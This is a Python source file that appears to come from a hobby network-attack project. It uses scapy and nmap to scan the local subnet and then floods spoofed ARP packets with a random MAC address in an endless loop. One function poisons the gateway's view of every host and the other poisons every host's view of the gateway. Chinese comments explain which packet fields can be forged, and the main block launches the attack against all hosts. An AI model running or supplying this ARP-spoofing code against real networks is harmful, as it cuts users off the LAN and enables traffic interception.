from scapy.all import *
import nmap.nmap as np
from scapy.layers.l2 import getmacbyip,ARP,Ether,Dot1Q
import firegod.scan.scan_by_gateway as scan_g
from firegod.scan.getway import getway,get_self_ifo
# victimac = getmacbyip("192.168.10.8")
# print(victimac)
# getmac = getmacbyip("10.18.80.254")
# print(getmac)
# ac=ARP()
# ls(ac)
# a = Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(psrc="10.10.41.221",pdst=,op=1)
# ls(a)
# a = ARP(pdst="10.18.80.57",op=1)
# asw = srp1(a)
# print(asw.show())


def arp_all_to_gateway(yanma=24,arg="-sP"):
    print("get host list")
    host_list = scan_g.scan_by_gate(yanma,arg)
    print(host_list)
    host_list.remove(get_self_ifo()[1])
    print("prepare arp")
    temp_gate,gate_mac = getway()

    print(f"find gate mac -- {gate_mac}")
    srcmac = RandMAC().__str__()
    """
    注意 
        Ether层是真正的物理层，其src 和dst不可被伪造，伪造src后会导致包发送无效，伪造dst则导致包发送到伪造的dst上
    Ether层是发送包必须的，默认情况下scapy会自动将目标地址和本机地址填入，其实现了包的发送，其中目标地址为ff:ff:ff:ff:ff:ff时为广播
    伪造的mac地址应在ARP层的hwdst hwsrc 中
        arp包分两种 op = 1  和 op = 2, 分别表示询问包和应答包 
    """
    arp_pk_list = [Ether()/ARP(psrc=x,pdst=temp_gate,hwsrc = srcmac) for x in host_list]
    # ls(arp_pk_list[0])
    while 1:
        for x in arp_pk_list:
            # ls(x)
            sendp(x)

def arp_to_all_host(yanma=24,arg="-sP"):
    print("get host list")
    host_list = scan_g.scan_by_gate(yanma, arg)
    host_list.remove(get_self_ifo()[1])
    print(host_list)
    print("prepare arp")
    temp_gate, gate_mac = getway()

    print(f"find gate mac -- {gate_mac}")
    srcmac = RandMAC().__str__()
    """
    注意 
        Ether层是真正的物理层，其src 和dst不可被伪造，伪造src后会导致包发送无效，伪造dst则导致包发送到伪造的dst上
    Ether层是发送包必须的，默认情况下scapy会自动将目标地址和本机地址填入，其实现了包的发送，其中目标地址为ff:ff:ff:ff:ff:ff时为广播
    伪造的mac地址应在ARP层的hwdst hwsrc 中
        arp包分两种 op = 1  和 op = 2, 分别表示询问包和应答包 
    """
    arp_pk_list = [Ether() / ARP(psrc=temp_gate, pdst=x, hwsrc=srcmac) for x in host_list]
    # ls(arp_pk_list[0])
    while 1:
        for x in arp_pk_list:
            # ls(x)
            sendp(x,inter=0.0001,count=5)

if __name__ =="__main__":
    # r_m = RandMAC().__str__()
    # temp_gate, gate_mac = getway()
    # # 错误 不可伪造ether a = Ether(src="34:64:A9:1E:47:E7",dst="30:3a:64:28:14:8c")/ARP(psrc="192.168.10.8",pdst="192.168.10.106",hwsrc="34:64:A9:1E:47:E7",hwdst="30:3a:64:28:14:8c",op=2)
    # b = Ether()/ARP(psrc="192.168.10.8",pdst="192.168.10.106")
    # print(a.show())
    # print("$$$" * 10)
    # print(b.show())
    #
    # while 1:
    #     print("a"*30)
    #     print(a.show())
    #     print("b" * 30)
    #     print(b.show())
    #     sendp(a,iface='WLAN')
    # ls(r)
    arp_to_all_host()


